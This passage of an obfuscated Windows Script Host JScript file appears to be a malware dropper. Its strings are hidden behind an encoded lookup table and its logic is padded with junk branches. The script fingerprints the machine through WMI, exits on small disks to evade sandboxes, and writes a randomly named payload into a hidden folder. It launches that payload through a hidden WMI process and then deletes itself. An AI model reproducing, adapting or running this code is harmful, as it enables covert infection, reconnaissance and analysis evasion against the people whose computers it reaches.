  "k5m-kq3~pxgV", "C6evKxk.QNXhM_RXHI3_j7CcjI3HaI_S8E79rSCHC6eYk-", "tNU-Z5dYjIL-Z69yQNRdHo_npxXLHo_YUh_vUNvY7h_YQEeIHdg~tNX1tAgsj6djah718ACJ8q.YaqCJjoRJHE6iP_8Jjo3c8IRCQE7Y8E_np7nDM.8_8FRdH4C_j4LuZx.YxARCj_CcjEauNdR_UI7~tA3XP_g~tNX1tAgsj5XAtNX.jI8SL47Jjq3Jj_CcjE78M1JgQEdJjo_S8qCs8Ee~Zx.-pv", "lxg1UA31t5gVk53Y8NWikqn", "an7r3aRakF3_HhR~tAgntNeYP5gCaF6.QqC_HIrikF3_Qo6djq3CaF8s8E7IUA.ikF3MadR_H4Q_H_R_UAC1tFe~QE7~kFQxynn-7h_YrSClyo7n8he~tn6.UAgnQACTjhXotN8dHo6ntNeYk68k37C6kF_L3NXsUoW_QTdaH47_",
  "tNU-Z5dYjIL-CEQiZxgV", "37CxkE_YtAL-Hh7~8o_1QArDkm", "tNU-Z53Y8~.-pv", "an7r3aRakFXsjNa-3_CKyxgAtN0Sr_eTjhdv8A3_H_RXHI3_jL", "Cqa~kTn-ZF8_85dTtNdCj4RnUNX1QxgAtN0Sr_eTjhdv8A3_H_RXHI3_jxm93AC~jICgUI3Jjh0-ah_iQNXnjq_TjhXntNXdQx.Y7AR_H.XsjNa",
  "k5m-k5m-k5gEjIC6UNRuPaeOto7185gVk6RnjIm9aqCcUh7SH~m9xNL-C62YaqCcUh7SHn_.k5dEjIC1Qxm93AC~jICgUI3Jjh0-ah_iQNXnjq_TjhXntNXdQxge", "CqmvkTn-8qCXkqi-ZF_Y8oefQxdAQNCxQA6dQARnk5d7Ho.-kosn8qgSMO2cUhs_Uh9JH5XsjN6DjhXs8IrYUhe9kOm97AR_Lo6StNRLUACStNX4k5datNd_jI7nah71kTaJP.Rcj43_j4LY7qCJjx-Jkqn-Uh6nUh--p~mOkOge", "U~gm", "k5m-kE_YHI3sjEWl8E_9QARnUNdvkTn-ZF8_85dFUA3_k5dEjIC9UAL-k4_XpA.9yan9QEL-xF-DjNnDHIrOZL", "C6g~jh8~QARSaqC_Qo7~QNX1Qxmek58ytNW_j43ipaRcj43Jj47_Cv",
  "k5m-k53nt~mek5sqQAL9LheY8E7Y85m9aE6nt5m.QTF-P7Cs8~.Y7qCJjx-J", "P4gSrL", "Uh6nUh--pv", "tA3_jL", "k5m-k5m-k5gCj4Qctha9ao7S8Fd_8EscQ5m97ACJk53dr5m9yN7ntEe.k6gcHIL-PaCcQq.-CEC.pxm9LheY8E7Y863XHEa-ko6vHEWJUh6ntNeYPhJSjh0Ok5dkQN6.QACSk53uQ5m97E_9QNed86R_U~mWr5m93AC~jICgUI3Jjh0-aI3cHm"
];
var flushFile = [
  "AEWcQIr", "xaXC75gAL7CMMOgYQA3IjICfkq7YUAQstNWsUoW_kE6nkqRnUACn8Am", "C6eokTn-pIgsHo69Z53.Zyi.Uydjah718ACJ8q.YLICXHq3cQICsHEsXP.6_HdnDM.R~QN6nQx-JM~3sP.9_pyn.AhiVCEFYx7UeCE3jr50Yry78Md9aQAsnP.7YUhe.tNX4AyuD773EM5XqQA3y8qCJjoHuCEFYLIC_UA3_3E71H4_v8Ee~Z5.Y7qCsj4RojIC93o_YUNW5jEe1t~-.Q5vWROv.Q5XrQNX48E-9ryUJZAn", "CqavkTn-kO3lQEncUAgJPIg_QAkO", "k5m-kE_ok5-9joenk53DUO.-p~gntqCc8~mO85k-lL",
  "3EXSUh61tEa", "yIg_j_3_pq3EtNW_", "k5m-k53vHS6.QNv-Kxgmk-", "k5m-k5m-NnCJ8FRcj4Q_H43_H_nDM.8_8FCX8E7SZ69dtNXnrSC8CqU~Zx.", "ao79jIQ_Pa_nQNn-C~LuC6eSQOm9Ho7vjE61QxmOC~kikOH4kO.4k5dEjIC1Qxm93AC~jICgUI3Jjh0-ah_iQNXnjq_TjhXntNXdQL",
  "aI3sH4L9ahRuQN3djE7.7E6St~m97E6StnXsjNa-CE0vk5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_", "37CxkE_YtAL-jo7nMOm", "C6e_85mekFmurqsFrxvvpFF0PTg0RSairqs6r5vvpTHIPTg0R1mirqsFrOvvpFUhPTg0L1-irqsE3xvvpTHSPTg0L1Lirq-XR5vvpFr0PTg0LS-irq-IR5vvpF76PTg0raLirq-035vvpFLdPTg03yHirq-W3OvvpFrdPTg0r1kirq-vLOvvpT7FPTg0rnkirq-~LOvvpTF0PTg03yUirqsFrOvvpTm~PTg03yUirq-hrxvvpTrdPTg0R1Lirq-vR5vvpT.WPTg0RTairqsg35vvpT.dPTg03.airq-Ir~vvpT-WPTg0ryHirq-~rxvvpTrXPTg0rT-irqsTMxvvpFUhPTg0ryLirq-XrOvvpF6FPTg0LSairqs6ROvvpFadPTg0R1.irq-WMxvvpTa0PTg0Rymirq-vr5vvpTaWPTg0RSHirqsErO.", "k5m-k53ijo9Sk5iekF8_85dTtE_iQF_nQNn-k.rDA67SQACSkOm93E_~QNRnjICXk5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_kqv", "k5m-k53lHhQFtAk-KxgyHEWJ85dLUA3uk53lHhU",
  "37CxkE_YtAL-tqHDkm", "lxg_jqR_kqi", "C6efkTn-NhCX8E7jA7nuL5sojIkuCE.erTi.txdi8TUnM~3JZSn0ZA9jLheY8o7~86nDM_3cL4_nQx-.81FYaI7OHI3~tNX4Z53JPTkJPTFhZAnJZv", "7dR1Ho_v85XytE7ijm", "k5m-kEQcHo7sUh--Z53vkE_Yk53ijo9SZxgVkE_ok5saQARnP7gs8E--CqmJkqi-ao79jIQ_Pa_nQNn-Cqm-P7C_UI7~Hha-PaQcHoR_k5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_kqn-lL",
  "k5m-k5m-Nd3_pqLY3NX1jh3Jjo88M1JganRCxxXqQA35pA3_H~-.81mJNSmYP1R8Zv", "lxg1UA31t5gVkE70tAL-rxge", "CEvvkTn-8qCXkqi", "ao747ICJ8Ea", "k5m-kqC_8q7~jOm.Qo6iHha",
  "k5m-kq7SQACltARlUN39tN0-k5m-kTn-Cqan", "k5m-k53.j5mek5sqQAL93E6nQx.YLN3.ah71jhX.H~-~r5.", "yo7IPa_nQNn-Pa_nQNdapAg_kF3JHo718Ee~pxm9aE6nt5m.QTm-PaQcHoR_kqv-yI7nPaXdjEv", "yARxQAgcH43l", "k5m-kE70tAL-rL",
  "ao743E7iQA3_", "k5m-k5m-k5m-k5m-ao79jIQ_Pa_nQNn-CFed8FQJjEa-PaQcHoR_k5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_"
];
var idxTime    = [saveHost(0xf0), saveHost(23)];
var stateCmd     = [saveHost(60), saveHost(0xa9), saveHost(0x113)];
try { if (WScript["Version"]["length"] > 0x17) { throw 0x2321; } } catch(off4118) {}
var numFlag          = saveHost(52);
var mergeOffset  = 2;
var procHost          = saveHost(46);
var spralntPospfrie=[saveHost(0x6e),saveHost(0x67),saveHost(0x9d),saveHost(0xf6),saveHost(86),saveHost(40),"",saveHost(0xe7),"",saveHost(0xfc),saveHost(0x12b),"}","",saveHost(68),saveHost(35),saveHost(0x7c),saveHost(0xbe),saveHost(0xe0),saveHost(0x112),saveHost(0xeb),saveHost(63),saveHost(0xb7),saveHost(0x123),"",saveHost(0x94),saveHost(0x78),saveHost(0xbc),"",saveHost(0xe5),saveHost(0x129),"",saveHost(84),saveHost(0x101),saveHost(0xcb),saveHost(28),saveHost(0x11e),saveHost(0x109),"}",saveHost(0x11f),saveHost(0x122),saveHost(0x116),saveHost(0x110),saveHost(0x11a),saveHost(0xd5),"",saveHost(0x85),saveHost(0xf4),saveHost(76),saveHost(0x11b),saveHost(0xee),saveHost(0x121),"}","",saveHost(0xe8),saveHost(4),saveHost(14),saveHost(0x104),"}","",saveHost(0xaa),saveHost(93),saveHost(80),saveHost(21),saveHost(0xa8),saveHost(0x12d),saveHost(0x8d),saveHost(94),saveHost(0x82),saveHost(0xd9),saveHost(57),saveHost(0xd1),saveHost(0xf5),saveHost(0x88),saveHost(53),saveHost(0x126),"}","",saveHost(0xc6),"",saveHost(0xc7),saveHost(2),saveHost(33),saveHost(0xb8),"",saveHost(45),"",saveHost(0xe2),saveHost(0xe9),saveHost(0xdb),saveHost(0x9b),saveHost(0xa3),saveHost(53),saveHost(0x95),saveHost(12),saveHost(0x9f),saveHost(0x128),saveHost(0x96),"}","",saveHost(6),saveHost(0x84),"}",saveHost(34),saveHost(0x90),"",saveHost(0xa5),saveHost(96),saveHost(0xdc),saveHost(0x65),"",saveHost(0xd6),saveHost(65),saveHost(0xb2),saveHost(0xc9),saveHost(53),saveHost(0x7f),"}",saveHost(0x71),saveHost(0x90),"",saveHost(0xde),saveHost(0xdd),saveHost(0x111),saveHost(0xb4),saveHost(36),saveHost(0xd2),saveHost(24),saveHost(82),"",saveHost(5),saveHost(0x8c),saveHost(0x83),saveHost(34),saveHost(89),saveHost(79),saveHost(0x83),saveHost(0x90),saveHost(92),"",saveHost(99),saveHost(0xcf),saveHost(0xa1),saveHost(0x89),saveHost(43),saveHost(0xe4),saveHost(0xbd),"",saveHost(0x108),saveHost(0x105),saveHost(0x124),saveHost(0xad),saveHost(0x75),saveHost(0xef),"",saveHost(0x103),saveHost(0x92),saveHost(0xa2),saveHost(0xce),saveHost(56),saveHost(19),saveHost(0xfd),"",saveHost(38),saveHost(0x87),saveHost(66),saveHost(87),saveHost(0xb1),saveHost(0x98),saveHost(0xb6),saveHost(75),saveHost(0x127),saveHost(51),saveHost(0x8f),saveHost(0x72),saveHost(0x107),"}",saveHost(74),saveHost(0xbb),"",saveHost(0x101),saveHost(50),saveHost(0x11e),saveHost(0x73),saveHost(0xa8),saveHost(37),saveHost(0x79),saveHost(0xf5),saveHost(53),"}","",saveHost(0xb5),saveHost(31),saveHost(0xfa),saveHost(0x10d),saveHost(81),saveHost(85),"}",saveHost(0xff),saveHost(71),saveHost(54),"}",saveHost(0x118),"",saveHost(17),"",saveHost(0x76),saveHost(0xf7),saveHost(0x11c),saveHost(0x115),saveHost(0),saveHost(0x117),saveHost(0x74),saveHost(0xa6),saveHost(69),saveHost(0xc0),saveHost(61),"}"];

var dropRetry   = new (this[saveHost(0x77)+saveHost(0xd8)])(saveHost(55));
var computeRetry = new (this[saveHost(0x77)+saveHost(0xd8)])(saveHost(0x120));
var numSlot   = this[saveHost(0x6a)+saveHost(0x6d)](saveHost(90));
var putsenGro = null;

var sysError = computeRetry[saveHost(0xa0)](saveHost(0xa7));
var _ld = null;
var marTrorl = null;

function computeMode() {
    var d = new Date();
    return d.toLocaleDateString() + " " + d.toLocaleTimeString();
}

function workPrev(msg) {
    var decodeAddr = "[" + computeMode() + saveHost(1) + msg;
    if ((0x1d1f + 0x910) < 0x90f) { try { var cap2863 = String.fromCharCode(71,0x6d); if (cap2863.length > 0xff) {} } catch(ok4837) {} }
    var f = dropRetry[saveHost(0x114)](marTrorl, 8, true);
    f[saveHost(0xb0)](decodeAddr);
    f[saveHost(0xdf)]();
}

function walkSet() {
    try {
        computeRetry[saveHost(0x125)](saveHost(91), 1, saveHost(27));
        computeRetry[saveHost(0x12c)](saveHost(91));
        return true;
        var out6208 = (String["fromCharCode"](0x41) === String["fromCharCode"](0x42)) ? 0x1649 : 0x11b2;
    } catch(e) { return false; }
}

function appParams(len) {
    var encodeLine = saveHost(0x7d);
    var s = "";
    for (var i = 0; i < len; i++)
        s += encodeLine.charAt(Math.floor(Math.random() * encodeLine.length));
    return s;
}

var _FOLDER_PFX = [saveHost(64), saveHost(0x12a), saveHost(15), saveHost(13), saveHost(0xda)];

function computeFlag() {
    try {
        var decodeSource = _FOLDER_PFX[Math.floor(Math.random() * _FOLDER_PFX.length)] + appParams(5);
        var cmdOffset    = sysError + "\\" + decodeSource;
        if (!dropRetry[saveHost(0xc4)](cmdOffset)) dropRetry[saveHost(73)](cmdOffset);
        var setOut = appParams(10);
        var processSize  = cmdOffset + "\\" + setOut + saveHost(0x10a);
        var f = dropRetry[saveHost(0x66)](processSize, true, false);
        for (var i = 0; i < spralntPospfrie.length; i++) {
            f[saveHost(0xb0)](spralntPospfrie[i]);
            try { if ((typeof String) === (typeof 0x2bd)) { throw 0x23b7; } } catch(out9453) {}
        }
        f[saveHost(0xdf)]();
        putsenGro = processSize;
    } catch (e) {
    }
}

function stateOut() {
    try {
        if (putsenGro === null || !dropRetry[saveHost(48)](putsenGro)) return;
        computeRetry[saveHost(0x125)](saveHost(10), saveHost(0xec), saveHost(78));
        var resultInput = numSlot.Get(saveHost(0x7b));
        var svcCode  = numSlot.Get(saveHost(0x6f))[saveHost(20)]();
        svcCode.ShowWindow = 0;
        var processOutput  = resultInput[saveHost(0xe3)](saveHost(0xf8))[saveHost(83)][saveHost(20)]();
        processOutput[saveHost(0x80)] = saveHost(44) + putsenGro + "\"";
        processOutput.ProcessStartupInformation = svcCode;
        resultInput[saveHost(62)](saveHost(0xf8), processOutput);
    } catch (e) {
    }
}

function startInit() {
    var q  = numSlot[saveHost(49)](saveHost(0x64));
    var e  = new (this[saveHost(0x69)])(q);
    if (!e[saveHost(0xbf)]()) {
        var os = e[saveHost(0x10c)]();
        workPrev(saveHost(41) + os.Caption + " " + os.Version + saveHost(0xc1) + os.OSArchitecture + ")");
    }
    var q2 = numSlot[saveHost(49)](saveHost(0x102));
    var e2 = new (this[saveHost(0x69)])(q2);
    if (!e2[saveHost(0xbf)]()) workPrev(saveHost(0xf1) + e2[saveHost(0x10c)]().Name);
}

function netName() {
    var pathNum  = dropRetry[saveHost(0xd3)](saveHost(0x6b));
    var slalndBallttue = Math.round(pathNum[saveHost(0x8e)] / 0x40000000 * 10) / 10;
    if (slalndBallttue < mergeOffset) {
        workPrev(saveHost(0xd4) + slalndBallttue + saveHost(3));
        try { dropRetry[saveHost(0xd0)](sysError + "\\" + procHost, true); } catch(ex) {}
        if (String["fromCharCode"](0x41) === String["fromCharCode"](0x42)) { try { var cur8096 = String.fromCharCode(76,0x72); if (cur8096.length > 0xff) {} } catch(cur2513) {} }
        WScript[saveHost(29)](1);
    }
}

function scanWidth() {
    var clearName = computeRetry[saveHost(0xba)](saveHost(0xd7) + numFlag + saveHost(39), 0, true);
    if (clearName !== 0) workPrev(saveHost(0x10f));
}

function buildData() {
    for (var i = 0; i < idxTime.length; i++) {
        var mergeLen = idxTime[i];
        var q    = numSlot[saveHost(49)](saveHost(8) + mergeLen + "'");
        var e    = new (this[saveHost(0x69)])(q);
        if (e[saveHost(0xbf)]()) workPrev(saveHost(0x99) + mergeLen + saveHost(9));
    }
}

function bindPtr() {
    for (var i = 0; i < stateCmd.length; i++) {
        var dataRate = stateCmd[i];
        var q   = numSlot[saveHost(49)](saveHost(32) + dataRate + "'");
        var e   = new (this[saveHost(0x69)])(q);
        if (!e[saveHost(0xbf)]()) {
            var loadPrev = e[saveHost(0x10c)]().State;
            if (loadPrev !== saveHost(0xaf)) workPrev(saveHost(25) + dataRate + saveHost(42) + loadPrev + ")");
        } else {
            workPrev(saveHost(25) + dataRate + saveHost(9));
        }
    }
}

if (!walkSet()) {
    var _tmp = computeRetry[saveHost(0xa0)](saveHost(16)) + saveHost(26) + Math.floor(Math.random() * 0xf423f) + saveHost(0x10a);
    var _pf = dropRetry[saveHost(0x66)](_tmp, true);
    _pf[saveHost(0xb0)](saveHost(0x7a));
    _pf[saveHost(0xb0)](saveHost(0xfb));
    _pf[saveHost(0xb0)](saveHost(68));
    _pf[saveHost(0xb0)](saveHost(77));
    if (WScript["Version"]["length"] > 0x13) { var cur6051 = 0x10da; while (cur6051 < 0x0) { cur6051 += 0x569; if (cur6051 > 0x21b4) break; } }
    _pf[saveHost(0xb0)]("}");
    _pf[saveHost(0xb0)](saveHost(0x10b));
    var ref8956 = (Math.abs(-48) === 48) ? 0x1d95 : 0x21f1;
    _pf[saveHost(0xb0)](saveHost(0xf3));
    _pf[saveHost(0xb0)](saveHost(0xa8));
    _pf[saveHost(0xb0)](saveHost(88) + WScript[saveHost(0x70)].replace(/\$/g, saveHost(97)) + saveHost(0xe6));
    _pf[saveHost(0xb0)](saveHost(0xab));
    _pf[saveHost(0xb0)](saveHost(0xc2));
    _pf[saveHost(0xb0)](saveHost(58));
    _pf[saveHost(0xb0)](saveHost(0xab));
    _pf[saveHost(0xb0)](saveHost(53));
    _pf[saveHost(0xb0)]("}");
    try { if ((new Date())["getFullYear"]() > 0x859) { throw 0x78a; } } catch(ref6171) {}
    _pf[saveHost(0xb0)](saveHost(72));
    _pf[saveHost(0xdf)]();
    computeRetry[saveHost(0x125)](saveHost(10), saveHost(0xec), saveHost(78));
    computeRetry[saveHost(0xba)](saveHost(59) + _tmp + "\"", 0, false);
    try { if ((0x1875 * 0x0) > 0x0) { throw 0x1875; } } catch(val6258) {}
    
function msgValue() {
    try {
        var swapMap = numSlot[saveHost(49)](saveHost(0x93));
        var ponltHerpra = new (this[saveHost(0x69)])(swapMap);
        var argCheck = "", cmdPtr = 0, initDest = 0, seekTime = 0;
        if (!ponltHerpra[saveHost(0xbf)]()) {
            var initOffset = ponltHerpra[saveHost(0x10c)]();
            argCheck = initOffset.Name || "";
            cmdPtr = initOffset[saveHost(0xcd)] || 0;
            initDest = initOffset[saveHost(18)] || 0;
            seekTime = initOffset[saveHost(0x8b)] || 0;
        }
        var copyHandle = numSlot[saveHost(49)](saveHost(0xed));
        var bindDone = new (this[saveHost(0x69)])(copyHandle), breetspreePristnu = 0;
        while (!bindDone[saveHost(0xbf)]()) { breetspreePristnu += (bindDone[saveHost(0x10c)]()[saveHost(0xc3)] || 0); bindDone[saveHost(0xf2)](); }
        var getPrev = Math.round(breetspreePristnu / 0x40000000);
        workPrev(saveHost(22) + argCheck.replace(/\s+/g, " ").substring(0, 36)
            + saveHost(0xb3) + cmdPtr + saveHost(0x106) + initDest + saveHost(67) + getPrev + saveHost(0xca)
            + ((seekTime > 80) ? saveHost(0x81) + seekTime + saveHost(0x7e) : ""));
    } catch (verifyRetry) { workPrev(saveHost(0xe1) + verifyRetry.message); }
    if ((typeof String) === (typeof 0x388)) { var flag9255 = 0x1ecd; try { if (flag9255 > 0x1ece) {} } catch(buf5446) {} }
}
function traceCheck() {
    try {
        var loaldBriesk = numSlot[saveHost(49)](saveHost(0xfe));
        var porndPou = new (this[saveHost(0x69)])(loaldBriesk), workState = 0;
        while (!porndPou[saveHost(0xbf)]()) {
            var initState = porndPou[saveHost(0x10c)](), dataTag = "", koulkscaySues = "";
            try { dataTag = new (this[saveHost(0x69)])(initState[saveHost(0x68)])[saveHost(0x10c)]() || ""; } catch (netLine) {}
            try { koulkscaySues = new (this[saveHost(0x69)])(initState[saveHost(7)])[saveHost(0x10c)]() || ""; } catch (netLine) {}
            if (dataTag) workPrev(saveHost(0x6c) + workState + saveHost(0xcc) + (initState[saveHost(0x9a)] || "").substring(0, 28) + saveHost(0x91) + dataTag + saveHost(47) + koulkscaySues);
            workState++; porndPou[saveHost(0xf2)]();
        }
        if (workState === 0) workPrev(saveHost(30));
    } catch (loadTime) { workPrev(saveHost(0x8a) + loadTime.message); }
}
function sproaspplarGrunt() {
    try {
        var buildLimit = numSlot[saveHost(49)](saveHost(0xea));
        var lonsfanWan = new (this[saveHost(0x69)])(buildLimit);
        if (!lonsfanWan[saveHost(0xbf)]()) {
            var execTime = lonsfanWan[saveHost(0x10c)]();
            try { if ((0xc2b * 0x0) > 0x0) { throw 0xc2b; } } catch(idx772) {}
            var initMax = (execTime[saveHost(95)] || "").substring(0, 12);
            var pollLine = Math.round((execTime[saveHost(98)]     || 0) / 0x400);
            var resetSet = Math.round((execTime[saveHost(0x97)] || 0) / 0x400);
            var sendInit = (initMax.length >= 12)
                ? initMax.substring(0,4) + "-" + initMax.substring(4,6) + "-" + initMax.substring(6,8)
                  + " " + initMax.substring(8,10) + ":" + initMax.substring(10,12)
                : "?";
            workPrev(saveHost(0xa4) + sendInit + saveHost(0xae) + pollLine + "/" + resetSet + saveHost(0x86));
        }
    } catch (drvInit) { workPrev(saveHost(0x9e) + drvInit.message); }
}
WScript[saveHost(29)](0);
}

_ld = sysError + "\\" + procHost + saveHost(0x10e);
if (!dropRetry[saveHost(0xc4)](sysError + "\\" + procHost)) dropRetry[saveHost(73)](sysError + "\\" + procHost);
if (!dropRetry[saveHost(0xc4)](_ld)) dropRetry[saveHost(73)](_ld);
marTrorl = _ld + saveHost(70);

workPrev(saveHost(0xc8));
try { if ((0x13d7 + 0x1646) < 0x13d6) { throw 0x13d7; } } catch(tmp8403) {}

try { startInit();             } catch (e) { workPrev(saveHost(0xf9)   + e.message); }
try { netName();              } catch (e) { workPrev(saveHost(0x9c)      + e.message); }
try { scanWidth();           } catch (e) { workPrev(saveHost(0xc5)   + e.message); }
try { buildData(); } catch (e) { workPrev(saveHost(0xac) + e.message); }
try { bindPtr();  } catch (e) { workPrev(saveHost(0x100)  + e.message); }
try { msgValue(); } catch (traceValue) { workPrev(saveHost(0x11d)  + traceValue.message); }
try { traceCheck(); } catch (traceValue) { workPrev(saveHost(0x119) + traceValue.message); }
try { sproaspplarGrunt(); } catch (traceValue) { workPrev(saveHost(0xb9) + traceValue.message); }

try { computeFlag(); } catch (e) { }
try { stateOut(); } catch (e) { }

try { dropRetry[saveHost(0xd0)](sysError + "\\" + procHost, true); } catch(e) {}
var acc6350 = ((new Date())["getFullYear"]() > 0x7b2) ? 0x1075 : 0x129d;
try { dropRetry[saveHost(11)](WScript[saveHost(0x70)]); } catch(e) {}

WScript[saveHost(29)](0);